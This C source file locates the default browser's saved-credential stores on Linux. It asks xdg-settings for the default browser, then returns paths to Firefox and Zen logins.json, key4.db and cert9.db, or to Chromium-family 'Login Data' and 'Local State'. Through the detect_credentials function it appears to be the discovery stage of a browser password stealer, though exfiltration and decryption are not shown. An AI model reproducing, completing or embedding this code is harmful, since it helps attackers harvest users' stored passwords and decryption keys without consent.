#define _DEFAULT_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>

#define MAX_PATH 1024

// Map browser desktop name to config subpath
const char* get_config_directory(const char* desktop_entry) {
    if (strstr(desktop_entry, "zen")) {
        return "/.zen";
    } else if (strstr(desktop_entry, "firefox")) {
        return "/.mozilla/firefox";
    } else if (strstr(desktop_entry, "chromium")) {
        return "/.config/chromium";
    } else if (strstr(desktop_entry, "brave")) {
        return "/.config/BraveSoftware/Brave-Browser";
    } else if (strstr(desktop_entry, "chrome")) {
        return "/.config/google-chrome";
    }
    return NULL;
}

//  Firefox-style profile => logins.json ,key4.db and cert9.db
int get_firefox_credentials(char* logins_path, char* key_db_path, char* cert9_db_path) {
    const char *home = getenv("HOME");
    if (!home) return 0;

    char base[MAX_PATH];
    snprintf(base, sizeof(base), "%s/.mozilla/firefox", home);

    DIR *d = opendir(base);
    if (!d) return 0;

    struct dirent *dir;
    while ((dir = readdir(d))) {
        if (dir->d_type == DT_DIR && strstr(dir->d_name, ".default")) {
            snprintf(logins_path, MAX_PATH, "%s/%s/logins.json", base, dir->d_name);
            snprintf(key_db_path, MAX_PATH, "%s/%s/key4.db", base, dir->d_name);
            snprintf(cert9_db_path, MAX_PATH, "%s/%s/cert9.db", base, dir->d_name);
            closedir(d);
            return 1;
        }
    }

    closedir(d);
    return 0;
}

//  zen profile => logins.json ,key4.db and cert9.db

int file_exists(const char *path) {
    struct stat st;
    return (stat(path, &st) == 0);
}

int get_zen_credentials(char* logins_path, char* key_db_path, char* cert9_db_path) {
    const char *home = getenv("HOME");
    if (!home) return 0;

    char base[MAX_PATH];
    snprintf(base, sizeof(base), "%s/.zen", home);

    DIR *d = opendir(base);
    if (!d) return 0;

    struct dirent *dir;

    while ((dir = readdir(d))) {
        if (dir->d_type == DT_DIR) {
            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;

            char profile_dir[MAX_PATH];
            snprintf(profile_dir, sizeof(profile_dir), "%s/%s", base, dir->d_name);

            char logins[MAX_PATH], keydb[MAX_PATH], certdb[MAX_PATH];
            snprintf(logins, sizeof(logins), "%s/logins.json", profile_dir);
            snprintf(keydb, sizeof(keydb), "%s/key4.db", profile_dir);
            snprintf(certdb, sizeof(certdb), "%s/cert9.db", profile_dir);

            if (file_exists(logins) && file_exists(keydb) && file_exists(certdb)) {
                strncpy(logins_path, logins, MAX_PATH);
                strncpy(key_db_path, keydb, MAX_PATH);
                strncpy(cert9_db_path, certdb, MAX_PATH);
                closedir(d);
                return 1;
            }
        }
    }

    closedir(d);
    return 0;
}




// Chromium-based browsers
int get_chromium_credentials(const char *config_dir, char* login_data, char* local_state) {
    const char *home = getenv("HOME");
    if (!home) return 0;

    snprintf(login_data, MAX_PATH, "%s%s/Default/Login Data", home, config_dir);
    snprintf(local_state, MAX_PATH, "%s%s/Local State", home, config_dir);

#ifdef DEBUG
    printf("Found Chromium credentials:\n  %s\n  %s\n", login_data, local_state);
#endif
    return 1;
}

int detect_credentials(char* output_path1, char* output_path2, char* output_path3) {
    FILE *fp;
    char desktop_entry[256] = {0};

    fp = popen("xdg-settings get default-web-browser", "r");
    if (!fp || !fgets(desktop_entry, sizeof(desktop_entry), fp)) {
        if (fp) pclose(fp);
        return 0;
    }
    pclose(fp);
    desktop_entry[strcspn(desktop_entry, "\n")] = 0;

#ifdef DEBUG
    printf("Detected browser .desktop: %s\n", desktop_entry);
#endif

    const char *config_subpath = get_config_directory(desktop_entry);
    if (!config_subpath) return 0;

    if (strstr(config_subpath, "mozilla")) {
        return get_firefox_credentials(output_path1, output_path2, output_path3);
    }
    else if (strstr(config_subpath, ".zen")){
        return get_zen_credentials(output_path1, output_path2, output_path3);

    } else {
        return get_chromium_credentials(config_subpath, output_path1, output_path2);
    }
}
